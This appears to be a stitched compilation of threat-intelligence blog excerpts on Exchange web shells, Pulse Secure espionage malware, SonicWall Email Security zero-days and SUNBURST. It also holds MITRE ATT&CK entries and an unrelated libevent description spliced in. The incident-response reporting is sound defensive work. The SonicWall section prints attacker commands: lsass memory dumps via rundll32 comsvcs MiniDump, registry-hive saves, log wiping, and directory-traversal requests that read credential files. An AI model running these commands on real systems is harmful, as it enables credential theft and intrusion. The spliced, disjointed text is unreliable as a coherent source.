our investigations to date, the web shells placed on Exchange Servers have been named differently in each intrusion, and thus the file name alone is not a high-fidelity indicator of compromise. If you believe your Exchange Server was compromised, we recommend investigating to determine the scope of the attack and dwell time of the threat actor. Furthermore, as system and web server logs may have time or size limits enforced, we recommend preserving the following artifacts for forensic analysis: We have found significant hunting and analysis value in these log folders, especially for suspicious CMD parameters in the ECP Server logs. We will continue updating technical details as we observe more related activity. The following are technical indicators we have observed, organized by the threat groups we currently associate with this activity. To increase investigation transparency, we are including a Last Known True, or LKT, value for network indicators. The LKT timestamp indicates the last time Mandiant knew the indicator was associated with the adversary; however, as with all ongoing intrusions, a reasonable time window should be considered. Indicator Type Note 165.232.154.116 Network: IP Address Last known true: 2021/03/02 02:43 182.18.152.105 Network: IP Address Last known true: 2021/03/03 16:16 Indicator Type MD5 help.aspx File: Web shell 4b3039cf227c611c45d2242d1228a121 iisstart.aspx File: Web shell 0fd9bffa49c76ee12e51e3b8ae0609ac Indicator Type MD5/Note Cobalt Strike BEACON File: Shellcode 79eb217578bed4c250803bd573b10151 89.34.111.11 Network: IP Address Last known true: 2021/03/03 21:06 86.105.18.116 Network: IP Address Last known true: 2021/03/03 21:39 FireEye detects this activity across our platforms.

Learn morearrow_forward Start for Free   On April 20, 2021, Mandiant published detailed results of our investigations into compromised Pulse Secure devices by suspected Chinese espionage operators. This blog post is intended to provide an update on our findings, give additional recommendations to network defenders, and discuss potential implications for U.S.-China strategic relations. Pulse Secure continues to work closely with Mandiant, affected customers, government partners, and other forensic experts to address these issues. Pulse Secureâs parent company, Ivanti, has released patches to proactively address software vulnerabilities and issued updated Security AdvisoriesÂ andÂ KnowledgeÂ Articles to assist customers. (Please see the Forensics, Remediation, and Hardening Guidelines section for additional details.) Mandiant is tracking 16 malware families exclusively designed to infect Pulse Secure VPN appliances and used by several cyber espionage groups which we believe are affiliated with the Chinese government. Between April 17Â and April 20, 2021, Mandiant incident responders observed UNC2630 access dozens of compromised devices and remove webshells like ATRIUM and SLIGHTPULSE. Both UNC2630 and UNC2717 display advanced tradecraft and go to impressive lengths to avoid detection. The actors modify file timestamps and regularly edit or delete forensic evidence such as logs, web server core dumps, and files staged for exfiltration. They also demonstrate a deep understanding of network appliances and advanced knowledge of a targeted network. This tradecraft can make it difficult for network defenders to establish a complete list of tools used, credentials stolen, the initial intrusion vector, or the intrusion start date. We continue to suspect that multiple groups including UNC2630 and UNC2717 are responsible for this activity, despite the use of similar exploits and tools. There is a high degree of variation in attacker actions within victim environments, with actors inconsistently using a combination of tools and command and control IP addresses. Reverse engineers on the FLARE team have identified four additional malware families specifically designed to manipulate Pulse Secure devices (Table 1). These utilities have similar functions to the 12 previously documented malware families: harvesting credentials and sensitive system data, allowing arbitrary file execution, and removing forensic evidence. Please see the Technical Annex for detailed analysis of these code families. Malware Family Description Actor BLOODMINE Â  BLOODMINE is a utility for parsing Pulse Secure Connect log files. It extracts information related to logins, Message IDs and Web Requests and copies the relevant data to another file. UNC2630 BLOODBANK Â  BLOODBANK is a credential theft utility that parses two files containing password hashes or plaintext passwords and expects an output file to be given at the command prompt. UNC2630 CLEANPULSE Â  CLEANPULSE is a memory patching utility that may be used to prevent certain log events from occurring. It was found in close proximity to an ATRIUM webshell. UNC2630 RAPIDPULSE Â  RAPIDPULSE is a webshell capable of arbitrary file read. As is common with other webshells, RAPIDPULSE exists as a modification to a legitimate Pulse Secure file. RAPIDPULSE can serve as an encrypted file downloader for the attacker. UNC2630 Table 1: New malware families identified Initial Compromise The actors leveraged several vulnerabilities in Pulse Secure VPN appliances. Mandiant observed the use of the recently patched vulnerability CVE-2021-22893 to compromise fully patched Pulse Secure appliances as well as previously disclosed vulnerabilities from 2019 and 2020. In many cases, determining the initial exploitation vector and timeframe was not possible to determine because the actors altered or deleted forensic evidence, or the appliance had undergone subsequent code upgrades thereby destroying evidence related to the initial exploitation. Establish Foothold In some cases, Mandiant observed the actors create their own Local Administrator account outside of established credential management controls on Windows servers of strategic value. This allowed the actor to maintain access to systems with short-cycle credential rotation policies and provided a sufficient level of access to operate freely within their target environment. The actors also maintained their foothold into the targeted environments exclusively through Pulse Secure webshells and malware without relying on backdoors deployed on internal Windows or Linux endpoints. Escalate Privileges Mandiant observed the actors use three credential harvesting techniques on Windows systems: In addition to these privilege escalation techniques, the actors specifically targeted separate privileged accounts belonging to individuals whose unprivileged accounts were previously compromised (likely through the Pulse Secure credential harvesting malware families). It is unclear how the account associations were made by the actor. Internal Reconnaissance Mandiant found evidence that the actors renamed their own workstations that they connected to the VPN of victim networks to mimic the naming convention of their target environment. This practice aligns with the actorâs objective for long-term persistence and evading detection and demonstrates a familiarity with the internal hostnames in the victim environment. The actors operated solely by utilizing Windows-based utilities to carry out tasks. Some of the utilities observed were net.exe, quser.exe, powershell.exe, powershell_ise.exe, findstr.exe, netstat.exe, cmd.exe, reg.exe and tasklist.exe. Move Laterally Most lateral movement originated from compromised Pulse Secure VPN appliances to internal systems within the environment. Â While connected to the Pulse VPN appliance, the actorâs system was assigned an IP address from the Pulse VPN DHCP pool and they moved laterally throughout the environments by leveraging the Remote Desktop Protocol (RDP), the Secure Shell Protocol (SSH), and browser-based communication to HTTPS hosted resources. The actors also accessed other resources such as Microsoft M365 cloud environments using stolen credentials they had previously acquired. Mandiant also observed the actors targeting ESXi host servers. The actor enabled SSH on ESXi hosts that were previously disabled via the web interface. When their operations on the system were finished, the actors disabled SSH on the ESXi host again and cleared or preemptively disabled all relevant logging associated with the performed activities. This includes authentication, command history, and message logging on the system. Maintain Presence Mandiant observed the threat actor maintain persistence by compromising the upgrade process on the Pulse Secure Appliance.Â  Persistence was primarily achieved by modifying the legitimate DSUpgrade.pm file to install the ATRIUM webshell across each upgrade performed by an administrator.Â  The actor likely chose DSUpgade.pm to host their patch logic as it is a core file in the system upgrade procedure, ensuring the patch is applied during updates. The patcher modifies content in /tmp/data as this directory holds the extracted upgrade image the newly upgraded system will boot into. This results in a persistence mechanism which allows the actor to maintain access to the system across updates. The actors also achieved persistence in other cases by prepending a bash script to the file /bin/umount normally used to unmount a Linux filesystem. This binary was targeted by the actor because it is executed by the Pulse Secure appliance during a system upgrade. The actorâs script verifies that the umount binary executes with a specific set of arguments, which are identical to the arguments used by the Pulse Secure appliance to executes the binary. The inserted malicious bash script remounts the filesystem as read-write and iterates through a series of bash routines to inject the ATRIUM webshell, hide SLOWPULSE from a legacy file integrity bash script, remove or add itself from the umount file, and validate the web process was running after a reboot to return the filesystem back to read-only. Complete Mission The threat actorâs objectives appear to be stealing credentials, maintaining long-term persistent access to victim networks, and accessing or exfiltrating sensitive data. Mandiant has observed the attackers: Analysis of new malware families is included in the Technical Annex to enable defenders to quickly assess if their respective appliances have been affected. Relevant MITRE ATT&CK techniques, Yara rules and hashes are published on Mandiantâs GitHub page. To begin an investigation, Pulse Secure users should contact their Customer Support Representative for assistance completing the following steps: To remediate a compromised Pulse Secure appliance: Â  To secure the appliance and assist with future investigations, consider implementing the following: In collaboration with intelligence analysts at BAE Systems Applied Intelligence, Mandiant has identified dozens of organizations across the defense, government, telecommunications, high tech, education, transportation, and financial sectors in the U.S. and Europe that have been compromised via vulnerabilities in Pulse Secure VPNs. Historic Mandiant and BAE investigations identified a significant number of these organizations as previous APT5 targets. Notably, compromised organizations operate in verticals and industries aligned with Beijingâs strategic objectives as outlined in Chinaâs 14th Five Year Plan. Many manufacturers also compete with Chinese businesses in the high tech, green energy, and telecommunications sectors. Despite this, we have not directly observed the staging or exfiltration of any data by Chinese espionage actors that could be considered a violation of the Obama-Xi agreement. Targets of Chinese cyber espionage operations are often selected for their alignment with national strategic goals, and there is a strong correlation between pillar industries listed in policy white papers and targets of Chinese cyber espionage activity. China has outlined eight key areas of vital economic interest for development and production which it views as essential to maintaining global competitiveness, under the following categories: energy, healthcare, railway transportation, telecommunications, national defense and stability, advanced manufacturing, network power, and sports and culture. Historical Context In the Red Line Drawn report, Mandiant documented a significant decline in the volume of Chinese cyberespionage activity in 2014 and assessed that the restructuring of China's military and civilian intelligence agencies significantly impacted Chinese cyber operations. Then, in September 2015, President Xi of China concluded a bilateral agreement with U.S. President Obama to prohibit state-sponsored theft of intellectual property for the purpose of providing commercial advantage. Commercial IP theft has historically been a prominent characteristic of Chinese cyber espionage activity. In 2018 we conducted an extensive review of Chinese cyber espionage operations, both before and after the official announcement of the PLA reforms and bilateral agreement to determine if there were any corresponding changes in the tactics, techniques, and procedures (TTPs) used during Chinese cyberespionage operations. We observed two important changes in the type of information stolen and the geographic distribution of the targets. Changes in Chinese Espionage Activity between 2019 and 2021 Based on developments observed between 2019-2021, Mandiant Threat Intelligence assesses that most Chinese APT actors now concentrate on lower-volume but more-sophisticated, stealthier operations collecting strategic intelligence to support Chinese strategic political, military, and economic goals. While some of the technical changes may be the result of the restructuring of China's military and civilian organizations, some changes possibly reflect larger technical trends in cyber operations overall. Redline Withdrawn? The Obama-Xi agreement prohibits the theft of intellectual property with purely commercial applications for the purpose of gaining a competitive advantage. It does not cover government or diplomatic information, sensitive business communications, IT data, PII, or intellectual property with military or dual use applications. Given the narrow definition of commercial intellectual property theft and the limited availability of forensic evidence, it is possible that our assessment will change with the discovery of new information. Evidence collected by Mandiant over the past decade suggests that norms and diplomatic agreements do not significantly limit China's use of its cyber threat capabilities, particularly when serving high-priority missions. The greater ambition and risk tolerance demonstrated by Chinese policymakers since 2019 indicates that the tempo of Chinese state-sponsored activity may increase in the near future and that the Chinese cyber threat apparatus presents a renewed and serious threat to US and European commercial entities.

Platform(s) Detection Name Network Security Email Security Detection On Demand Malware File Scanning Malware File Storage Scanning Endpoint Security Real-Time Detection (IOC) Helix Establish Foothold Escalate Privileges Internal Reconnaissance Move Laterally BLOODMINE BLOODMINE is a utility for parsing Pulse Secure Connect log files. It extracts information related to logins, Message IDs and Web Requests and copies the relevant data to another file. The sample takes three command line arguments It parses the input file for login status codes: AUT31504 AUT24414 AUT22673 AUT22886 AUT23574 It parses the input file for web results code WEB20174.

BLOODBANK takes advantage of a legitimate process that supports Single Sign On functionality and looks for plaintext passwords when they are briefly loaded in memory. The utility parses the following two files containing password hashes or plaintext passwords: BLOODBANK expects an output file as a command line parameter, otherwise it prints file open error. It contains the following strings which it likely tries to extract and target. PRIMARY SECONDARY remoteaddr user@ logicUR logicTim passw@ userAge realm Sourc CLEANPULSE CLEANPULSE is a memory patching utility that may be used to prevent certain log events from occurring. The utility inserts two strings from the command line into the target process and patches code to conditionally circumvent a function call in the original executable. File Name File Type Size Compile Time dsrlog ELF.X86 13332 Â  The utility expects to be run from the command line as follows: drslog <pid> <code2_string> <code3_string> <command> Where <pid> is the pid process ID to patch in memory, <code2_string> and <code3_string> are two strings to write into the target process, and <command> is either 'e' or 'E' for installation or 'u' or 'U' for uninstallation. During installation (using the 'e' or 'E' <command>), the <code2_string> <code3_string> command line strings are written to the target process at hard-coded memory addresses, a small amount of code is written, and a jump instruction to the code snippet is patched in memory of the target process. The added code checks whether an argument is equal to either <code2_string> <code3_string> strings, and if, so skips a function call in the target process. During uninstall (using the 'u' or 'U' <command>) the patch jump location is overwritten with what appears to be the original 8 bytes of instructions, and the two additional memory buffers and the code snippet appear to be overwritten with zeros. The CLEANPULSE utility is highly specific to a victim environment. It does not contain any validation code when patching (i.e. verifying that code is expected prior to modifying it), and it contains hard-coded addresses to patch. The target code to patch appears to be the byte sequence: 89 4C 24 08 FF 52 04. This appears as the last bytes in the patched code, and is the 8-bytes written when the uninstall 'u' command is given. These bytes correspond to the following two instructions: .data:0804B138 89 4C 24 08Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  movÂ Â Â Â  [esp+8], ecx .data:0804B13C FF 52 04Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  callÂ Â Â  dword ptr [edx+4] This byte sequence occurs at the hard-coded patch address the utility expects, dslogserver. Based on status and error messages in nearby functions the executable dslogserver appears to be related to log event handling, and the purpose of the CLEANPULSE utility may be to prevent certain events from being logged. There are several un-referenced functions that appear to have been taken from the open source project PUPYRAT. It is likely that the actor re-purposed this open source code, using PUPYRAT as a simple template project. RAPIDPULSE RAPIDPULSE is a webshell capable of arbitrary file read. As is common with other webshells, RAPIDPULSE exists as a modification to a legitimate Pulse Secure file. The webshell modifies the legitimate file's main routine which compares the HTTP query parameter with key name: deviceid to a specific Â key with value. If the parameter matches, then the sample uses an RC4 keyÂ  to decrypt HTTP query parameter with key name: hmacTime. This decrypted value is a filename which the sample then opens, reads, RC4 encrypts with the same key, base64 encodes, then writes to stdout. The appliance redirects stdout as the response to HTTP requests. This serves as an encrypted file download for the attacker. In our public report, we noted two code families that manipulateÂ check_integrity.sh, a legitimate script used during a normal system upgrade. This validation script was modified by the actor to exit early so that it would not perform the intended checks. Per Ivanti, the validation provided by check_integrity.sh is a separate validation feature and not the same as the Integrity Checker Tool (ICT) available on their website. They recommend that organizations use the online ICT to confirm that hashes of files on their Pulse Secure devices match Ivantiâs list of known good hashes. Please note that the ICT does notÂ scan the rollback partition.

Learn morearrow_forward Start for Free   In March 2021, Mandiant Managed Defense identified three zero-day vulnerabilities in SonicWallâs Email Security (ES) product that were being exploited in the wild. These vulnerabilities were executed in conjunction to obtain administrative access and code execution on a SonicWall ES device. The adversary leveraged these vulnerabilities, with intimate knowledge of the SonicWall application, to install a backdoor, access files and emails, and move laterally into the victim organizationâs network. The vulnerabilities are being tracked in the following CVEs: CVE-2021-20021 9.8 Unauthorized administrative account creation CVE-2021-20022 7.2 Post-authentication arbitrary file upload CVE-2021-20023 4.9 Post-authentication arbitrary file read Mandiant has been coordinating with the SonicWall Product Security and Incident Response Team (PSIRT) for the responsible disclosure of this information. SonicWall advises all customers and partners to upgrade to the 10.0.9.6173 Hotfix for Windows users, and the 10.0.9.6177 Hotfix for hardware and ESXi virtual appliance users. SonicWall Hosted Email Security product was automatically updated for all customers and no additional action is required for patching purposes. The hotfixes will also be superseded by the upcoming SonicWall ES 10.0.10 release. More information can be found by visiting the KB article published by SonicWall. All patches, upgrades, and hotfixes are available to download on the MySonicWall site. SonicWall Email Security (ES) is an email security solution that âprovides comprehensive inbound and outbound protection, and defends against advanced email-borne threats such as ransomware, zero-day threats, spear phishing and business email compromise (BEC).â The solution can be deployed as a physical appliance, virtual appliance, software installation, or a hosted SaaS solution. Like many appliances, the solution provides a rich, web-accessible administrative interface that serves as the main avenue for product configuration. Depending on the customerâs deployment method, this software is potentially capable of running under Windows or Unix because it heavily leverages OS-independent Apache Tomcat and Java. While the solution doesnât require that this interface be exposed to the internet, internet-wide scanning shows approximately 700 publicly reachable interfaces. In March 2021, Mandiant Managed Defense identified post-exploitation web shell activity on an internet-accessible system within a customerâs environment. Managed Defense isolated the system and collected evidence to determine how the system was compromised. The system was quickly identified as a SonicWall Email Security (ES) application running on a standard Windows Server 2012 installation. The adversary-installed web shell was being served through the HTTPS-enabled Apache Tomcat web server bundled with SonicWall ES. Due to the web shell being served in the applicationâs bundled web server, we immediately suspected the compromise was associated with the SonicWall ES application itself. When we contacted the customer, we learned that the installation of SonicWall ES was the latest version available for download (10.0.9) and that there was no publicly available information pertaining to vulnerabilities or in-the-wild exploitation. To determine if a potential application-level vulnerability was exploited to install the web shell, Mandiant collected endpoint telemetry data. We soon identified post-exploitation activity aimed at destroying evidence on the system, executed in the context of the web shell. The adversary executed the following command, shortly after installing the web shell: cmd.exe /c ""echo """" > ""C:/Program Files (x86)/SonicWallES/logs/webUI/webui.json Figure 3: The Adversary clearing existing entries in the current âwebui.jsonâ log This command deleted the most recent application-level log entries recorded by the SonicWall ES web application. While clearing log files is a standard anti-forensics technique, understanding the location of internal log files generated by applications is usually overlooked by most spray-and-pray attackers. This added fuel to our suspicion that we were dealing with an adversary who had intimate knowledge of how the SonicWall ES application worked. Fortunately for us, additional log files and a previously created virtual server snapshot provided enough evidence to track down the vulnerabilities and the adversaryâs activities on the host. Unauthenticated administrative access through improperly secured API endpoint The SonicWall Email Security application contains an authenticated control panel to provide administration capabilities. One feature available allows application administrators to authorize an additional administrator account from a separate Microsoft Active Directory Organization Unit (AD OU). https://<SonicWall ES host>/createou?data=<XML HERE> Figure 4: A redacted example of the vulnerable endpoint associated with arbitrary user creation Requests to this form, however, were not verified to require previous authentication to the appliance. Due to this vulnerability, an adversary with a well-crafted XML document could either GET or POST their document to the application and create a ârole.ouadminâ account (Figure 4). This account could then be used to authenticate to the application as an administrator. Arbitrary file upload through post-authenticated âbrandingâ feature Like many enterprise products with a web-based user interface, SonicWall Email Security includes a feature known as ""branding"" which gives administrators the ability to customize and add certain assets to the interface, such as company logos. These branding assets are managed via packages, and new packages can be created by uploading ZIP archives containing custom text, image files, and layout settings. A lack of file validation can enable an adversary to upload arbitrary files, including executable code, such as web shells. Once uploaded, these branding package ZIP archives are normally expanded and saved to the <SonicWall ES install path>\data\branding directory. However, an adversary could place malicious files in arbitrary locations, such as a web accessible Apache Tomcat directory, by crafting a ZIP archive containing a file within a sequence of directory traversal notations such as in Figure 5. It is important to note that the lack of validation which enables Zip Slip attacks is not unique to SonicWall Email Security. As detailed in Snyk's research on the topic, they exist within the many code libraries from which applications have been built. Directory-traversal leads to arbitrary file read in post-authenticated ""branding"" feature Mandiant confirmed another post-authentication vulnerability in the administrative panelâs built-in ""branding"" feature which allowed an adversary to retrieve arbitrary files from the host by sending crafted HTTP GET requests to a particular resource. Figure 6 demonstrates the formatting of such request. https://<SonicWall ES host>/dload_apps?action=<any value>&path=..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fcalc.exe&id=update Figure 6: An example web request which results in downloading the Windows calculator While the working directory of this branding feature is <SonicWall ES install path>\data\updates, a directory-traversal vulnerability allows an adversary to access files located outside of this directory. As the Apache Tomcat webserver handling this request is operating as the NT AUTHORITY\SYSTEM account, any file on the operating system can be accessed. Combinations of all three exploits were leveraged interchangeably by the adversary to perform the following actions: Upon obtaining administrative access to the appliance through CVE-2021-20021, an adversary sent crafted HTTP requests to the resource /dload_apps, a component of the application's ""branding"" feature, exploiting CVE-2021-20023. These requests leveraged directory traversal attacks, enabling access to two sensitive XML configuration files located at <SonicWall ES install path>\data\multi_accounts.xml and <SonicWall ES install path>\data\multi_ldap.xml, respectively (Figure 7). GET /dload_apps?action=REDACTED&path=..%2Fmulti_accounts.xml&id=update GET /dload_apps?action=REDACTED&path=..%2Fmulti_ldap.xml&id=update Figure 7: HTTP GET requests exploiting CVE-2021-20023 These files contained details about existing accounts as well as Active Directory credentials used by the application. Next, the adversary uploaded a ZIP archive containing the BEHINDER JSP web shell from the administrative panel's ""branding"" page. The crafted ZIP archive used a Zip Slip attack to exploit CVE-2021-20022, which caused the web shell to be written to the web-accessible Apache Tomcat directory <SonicWall ES install path>\Apache Software Foundation\Tomcat 9.0\webapps\SearchEngineRMIService\. BEHINDER is a publicly available, multi-platform web shell that accepts encrypted command and control (C2) communications. In principle, BEHINDER operates similarly to CHINA CHOPPER, a popular web shell that has been previously detailed by FireEye. Like CHINA CHOPPER, an adversary operates a client-side application to pass commands to the web shell within the body of HTTP requests. As the core functionality of the backdoor is contained within the client-side application, BEHINDERâmuch like CHINA CHOPPERâhas the added benefit of being small, with the variant observed in this investigation weighing in at less than 1 kilobyte (Figure 8). With the addition of a web shell to the server, the adversary had unrestricted access to the command prompt, with the inherited permissions of the NT AUTHORITY\SYSTEM account. After clearing the SonicWall application âwebui.jsonâ log file, the adversary escalated their attack to credential harvesting in preparation of moving laterally into the victim's network. The adversary relied on âliving off the landâ techniques rather than bringing their own tools into the environment, which often has the benefit of potentially avoiding detections from a security product. We observed the adversary executing the reg save command to dump the HKLM\SAM, HKLM\SYSTEM, and HKLM\SECURITY registry hives, which contain vital information in recovering password hashes and LSA secrets. Additionally, the adversary obtained in-memory sensitive credentials through the use of built-in memory dumping techniques. The adversary was observed invoking the MiniDump export of the Windows DLL comsvcs.dll to dump both the process memory for lsass.exe and the running instance of Apache Tomcat as seen in Figure 9. rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass PID> c:\windows\temp\TS_LAS.dmp full rundll32.exe C:\windows\system32\comsvcs.dll MiniDump <Tomcat PID> C:\windows\temp\TS_FF9DG.dmp full Figure 9: The adversary acquiring process memory for lsass.exe (MITRE ATT&CK T1003.001) and Apache Tomcat Mandiant typically observes adversaries employing short and easy-to-type filenames during their operations, simply for efficiency. As such, the aforementioned filenames initially stood out as being peculiar, as a mix of case and symbols would require more effort to type than is often necessary. While this could always be indicative of a tool being used, the slight variations between the two commandsâthe absence of a comma before the DLL export and the uppercase C:\ drive in the secondâsuggest that they were manually typed. Considering that the C:\Windows\Temp\ directory on a Windows host also normally contains numerous similarly named temporary files, the adversary was likely taking extra care to evade suspicion should the activity reach the screen of a security analyst. Continuing their effort to live off the land as much as possible, the adversary located a copy of the archiving utility 7-Zip already present on the host and used it to compress a subdirectory of <SonicWall ES install path>\data\archive\. This directory contains daily archives of emails processed by SonicWall ESâagain demonstrating the adversaryâs familiarity with the application. After a several-day lull in activity, the adversary returned to the host, presumably after working to recover passwords from the registry hives and process memory that was dumped earlier. At the time of activity, the victim organization was using the same local Administrator password across multiple hosts in their domain, which provided the adversary an easy opportunity to move laterally under the context of this accountâhighlighting the value of randomizing passwords to built-in Windows accounts on each host within a domain. We observed the adversary leveraging Impacketâs publicly available WMIEXEC.PY tool to access several internal hosts, which enabled remote command execution over Microsoft's DCOM protocol via Windows Management Instrumentation (WMI). The adversary managed to briefly perform internal reconnaissance activity prior to being isolated and removed from the environment. Mandiant currently tracks this activity as UNC2682. Ultimately, Mandiant prevented UNC2682 from completing their mission so their objectives of the attack currently remain unknown. Each investigation conducted by Mandiant includes analysts from our Advanced Practices team who work to correlate activity observed in the thousands of investigations that Mandiant responds to. At times, we do not have the data available to directly attribute intrusion activity to a previously known group. In these cases, we create a new UNC group to track the activity that we observed. An UNC group is a cluster of related cyber intrusion activity, which includes observable artifacts such as adversary infrastructure, tools, and tradecraft, that we are not yet ready to give a classification such as APT or FIN. For more details on how Mandiant uses UNC groups, see our blog post: DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors. Mandiant recommends monitoring of the following endpoint telemetry indicators for potential evidence of compromise: In addition to standard indicators, Mandiant recommends reviewing SonicWall-related internal configuration files and logs for evidence of previous adversary activity. Evidence of malicious web requests and their values may be identifiable in the following log files: Evidence of unauthorized modifications to SonicWall configuration settings can be confirmed in the following files: FireEye detects this activity across our platforms. The following contains specific detection names that provide an indicator of SonicWall ES exploitation or post-exploitation activities associated with this adversary. Product Signature FireEye Endpoint Security FireEye Network Security FireEye Email Security FireEye Detection On Demand FireEye Malware File Scanning FireEye Malware File Storage Scanning FireEye Helix Additionally, SonicWall has deployed Intrusion Prevention System (IPS) signatures to SonicWall firewalls to help detect and block attacks that attempt to leverage the aforementioned vulnerabilities. The following signatures have already been applied to SonicWall firewalls with active security subscriptions: Organizations can validate their security controls using the following actions with Mandiant Security Validation.

libevent is meant to replace the event loop found
in event driven network servers.  An application just needs to call
event_dispatch() and then add or remove events dynamically
without having to change the event loop.

Currently, libevent supports
/dev/poll,
kqueue(2),
event ports,
POSIX select(2),
Windows select(),
poll(2),
and epoll(4).

The internal event mechanism is completely independent of the exposed
event API, and a simple update of libevent can provide new
functionality without having to redesign the applications.  As a
result, Libevent allows for portable application development
and provides the most scalable event notification mechanism available
on an operating system.
Libevent can also be used for multi-threaded
applications, either by isolating each event_base so that only a single
thread accesses it, or by locked access to a single shared event_base.
Libevent should compile on Linux, *BSD,
Mac OS X, Solaris, Windows, and more.

Libevent additionally provides a sophisticated framework for buffered network
IO, with support for sockets, filters, rate-limiting, SSL, zero-copy file
transmission, and IOCP.  Libevent includes support for several useful
protocols, including DNS, HTTP, and a minimal RPC framework.

Mandiant Blog 3,https://attack.mitre.org/techniques/T1480/,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversaryâs campaign.[1] Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.[2] Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match. Anchor can terminate itself if specific execution flags are not present.[3] BitPaymer compares file names and paths to a list of excluded names and directory names during encryption.[4] BoomBox can check its current working directory and for the presence of a specific file and terminate if specific values are not found.[5] DEADEYE can ensure it executes only on intended systems by identifying the victim's volume serial number, hostname, and/or DNS domain.[6] EnvyScout can call window.location.pathname to ensure that embedded files are being executed from the C: drive, and will terminate if they are not.[5] NativeZone can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.[5][7] Small Sieve can only execute correctly if the word Platypus is passed to it on the command line.[8] Stuxnet checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met.[9] SUNSPOT only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values.[10]  Torisma is only delivered to a compromised host if the victim's IP address is on an allow-list.[11] VaporRage has the ability to check for the presence of a specific DLL and terminate if it is not found.[5] Execution Guardrails likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised. Monitor executed commands and arguments that may gather information about the victim's business relationships that can be used during targeting. Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. Detecting the use of guardrails may be difficult depending on the implementation.

Mandiant Blog 3,https://attack.mitre.org/techniques/T1562/006/,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting[1] or even disabling host-based sensors, such as Event Tracing for Windows (ETW)[2], by tampering settings that control the collection and flow of event telemetry.[3] These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation. For example, adversaries may modify the File value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.[4]  ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors [5]. Brute Ratel C4 has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).[6][7] Ebury can hook logging functions so that nothing from the backdoor gets sent to the logging facility.[8]  HermeticWiper has the ability to set the HKLM:\SYSTEM\\CurrentControlSet\\Control\\CrashControl\CrashDumpEnabled Registry key to 0 in order to disable crash dumps.[9][10][11] Waterbear can hook the ZwOpenProcess and GetExtendedTcpTable APIs called by the process of a security product to hide PIDs and TCP records from detection.[12] Woody RAT has suppressed all error reporting by calling SetErrorMode with 0x8007 as a parameter.[13] Ensure event tracers/forwarders [14], firewall policies, and other associated mechanisms are secured with appropriate permissions and access controls. Consider automatically relaunching forwarding mechanisms at recurring intervals (ex: temporal, on-logon, etc.) as well as applying appropriate change management to firewall rules and other related system configurations. Ensure event tracers/forwarders [14], firewall policies, and other associated mechanisms are secured with appropriate permissions and access controls and cannot be manipulated by user accounts. Monitor executed commands and arguments that may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data. Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. [3] To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME{PROVIDER_GUID}

Learn morearrow_forward Start for Free   UPDATE (May 2022):Â We haveÂ merged UNC2452 with APT29. The UNC2452 activity described in this post is now attributed to APT29. FireEye has uncovered a widespread campaign, that we are tracking as UNC2452. The actors behind this campaign gained access to numerous public and private organizations around the world. They gained access to victims via trojanized updates to SolarWindâs Orion IT monitoring and management software. This campaign may have begun as early as Spring 2020 and is currently ongoing. Post compromise activity following this supply chain compromise has included lateral movement and data theft. The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security. SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers. We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST. After an initial dormant period of up to two weeks, it retrieves and executes commands, called âJobsâ, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services. The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity. The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers. Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized 